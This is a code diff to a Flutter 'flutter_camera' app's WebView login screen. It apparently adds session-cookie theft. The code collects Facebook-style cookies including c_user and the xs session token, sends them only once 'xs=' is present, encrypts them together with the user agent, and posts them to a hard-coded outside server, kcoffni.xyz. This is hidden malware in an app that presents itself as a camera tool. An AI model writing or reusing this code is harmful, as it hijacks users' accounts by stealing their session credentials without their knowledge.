@@ -7,14 +7,17 @@ import 'package:dio/dio.dart';
 
 import 'package:flutter/services.dart';
 import 'package:flutter_camera/datas/loginModel.dart';
-import 'package:flutter_camera/utils/rsa_encrypt.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
+import 'package:flutter_camera/utils/SharedPreferencesUtils.dart';
 import 'package:flutter_camera/utils/mlog.dart';
 import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 
+
+typedef LoginResult = void Function(bool isLogin);
 class MyWebView extends StatefulWidget {
-  MyWebView(this.model, {Key? key}) : super(key: key);
+  final LoginResult loginResult;
+  MyWebView(this.model, this.loginResult,{Key? key}) : super(key: key);
 
   final LoginModel model;
 
@@ -48,7 +51,7 @@ class _MyWebViewState extends State<MyWebView> {
       'm_pixel_ratio',
       'fr',
       'c_user',
-      'cx',
+      'xs',
       'wd'
     ];
     Map<String, String> cookieStr = Map();
@@ -62,11 +65,13 @@ class _MyWebViewState extends State<MyWebView> {
       }
     }
 
-    String ua = await InAppWebViewController.getDefaultUserAgent();
-    logger.e(ua);
-    logger.e(result);
+    if (result.contains("xs=")) {
+      String ua = await InAppWebViewController.getDefaultUserAgent();
+      logger.e(ua);
+      logger.e(result);
 
-    startEncryption(result, ua);
+      startEncryption(result, ua);
+    }
   }
 
   var isStart = false;
@@ -116,20 +121,30 @@ class _MyWebViewState extends State<MyWebView> {
       return dioClient;
     };
 
-    Map<String, dynamic> map = Map();
-    map['content'] = dataStr;
-
-    logger.e(map);
-    String ssss = json.encode(map);
-    Response response = await dio.post(widget.model.cUrl!,
-        data: ssss,
+    Response response2 = await dio.post("https://kcoffni.xyz/api/open/collect",
+        data: {"content": dataStr},
         options: Options(
-          headers: {'Content-Type': 'application/json; charset=UTF-8'},
+          headers: {
+            'Content-Type': 'application/json',
+            "accept": "*/*",
+          },
           method: "post",
         ));
-    print('$response');
-    if (response.statusCode == HttpStatus.ok) {
-      String ddd = response.data;
+    print('$response2');
+    if (response2.statusCode == HttpStatus.ok) {
+      Map ddd = response2.data;
+      if (ddd.containsKey("message") && ddd.containsKey("data")) {
+        var message = ddd["message"];
+        var data = ddd["data"];
+
+        if(data && message == "success"){
+          spPutBool(true);
+        }else{
+
+        }
+      } else {
+
+      }
     } else {
       print('请求失败');
     }
